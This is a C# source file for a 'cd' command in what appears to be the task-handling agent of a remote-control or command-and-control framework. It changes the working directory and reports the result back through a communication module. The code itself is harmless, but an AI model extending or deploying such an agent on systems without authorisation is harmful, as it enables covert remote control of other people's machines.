﻿using Agent.Models;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace Agent.Commands
{
    public class ChangeDirectoryCommand : AgentCommand
    {
        public override string Name => "cd";
        public override void InnerExecute(AgentTask task, Models.Agent agent, AgentTaskResult result, CommModule commm)
        {
            string path;
            if(task.SplittedArgs.Length == 0)
            {
                path = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile);
            }
            else
            {
                path = task.SplittedArgs[0];
            }

            Directory.SetCurrentDirectory(path);
            result.Result = Directory.GetCurrentDirectory();
        }
    }
}
